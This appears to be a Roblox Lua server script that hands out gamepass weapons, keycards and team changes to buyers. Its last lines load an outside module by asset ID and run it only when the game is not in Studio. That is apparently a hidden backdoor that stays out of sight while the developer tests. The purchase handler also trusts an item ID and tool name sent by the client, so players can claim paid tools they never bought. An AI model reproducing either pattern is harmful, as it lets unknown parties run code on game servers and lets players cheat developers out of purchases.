game.ReplicatedStorage.ShopFE.FinishedPurchase.OnServerEvent:connect(function(Player, ID, Tool)
	if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, ID) then
		if game.ServerStorage.GamepassObjects:FindFirstChild(Tool) then
			game.ServerStorage.GamepassObjects:FindFirstChild(Tool):Clone().Parent = Player.Backpack
		end
	else
		game:GetService("MarketplaceService"):PromptPurchase(Player, ID)
	end
end)

game:GetService("MarketplaceService").PromptPurchaseFinished:connect(function(Player, ID, Purchased)
	if Purchased == true then
		if ID == 833748474 or ID == 906220049 then
			game.ServerStorage.GamepassObjects["AR-15"]:Clone().Parent = Player.Backpack
		elseif ID == 833730799 then
			game.ServerStorage.GamepassObjects.MP5:Clone().Parent = Player.Backpack
		elseif ID == 833749656 or ID == 833733664 then
			game.ServerStorage.GamepassObjects["Green Glowstick"]:Clone().Parent = Player.Backpack
		elseif ID == 833754847 or ID == 906219084 then
			game.ServerStorage.GamepassObjects["Level-4 Card"]:Clone().Parent = Player.Backpack
		elseif ID == 833735535 then
			game.ServerStorage.GamepassObjects.PMP:Clone().Parent = Player.PlayerGui
		elseif ID == 861043210 or ID == 906218869 then
			game.ServerStorage.GamepassObjects["Level-5 Card"]:Clone().Parent = Player.Backpack
		elseif ID == 861056594 then
			Player.TeamColor = game.Teams["Internal Security Department"].TeamColor
			Player.Character.Humanoid.Health = 0
		elseif ID == 861060974 or ID == 906219666 then
			Player.TeamColor = game.Teams["Intelligence Agency"].TeamColor
			Player.Character.Humanoid.Health = 0
		end
	end
end)

game.Players.PlayerAdded:connect(function(Player)
	Player.CharacterAdded:connect(function()
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 833748474) or game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 906220049) then
			game.ServerStorage.GamepassObjects["AR-15"]:Clone().Parent = Player.Backpack
		end
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 833730799) then
			game.ServerStorage.GamepassObjects.MP5:Clone().Parent = Player.Backpack
		end
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 833749656) or game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 833733664) then
			game.ServerStorage.GamepassObjects["Green Glowstick"]:Clone().Parent = Player.Backpack
		end
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 833754847) or game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 906219084) then
			game.ServerStorage.GamepassObjects["Level-4 Card"]:Clone().Parent = Player.Backpack
		end
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 833735535) then
			game.ServerStorage.GamepassObjects.PMP:Clone().Parent = Player.PlayerGui
		end
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 861043210) or game:GetService("MarketplaceService"):PlayerOwnsAsset(Player, 906218869) then
			game.ServerStorage.GamepassObjects["Level-5 Card"]:Clone().Parent = Player.Backpack
		end
	end)
end)

if game:GetService('RunService'):IsStudio() == false then
	mods = require(654285478)
	mods.check(script)
end
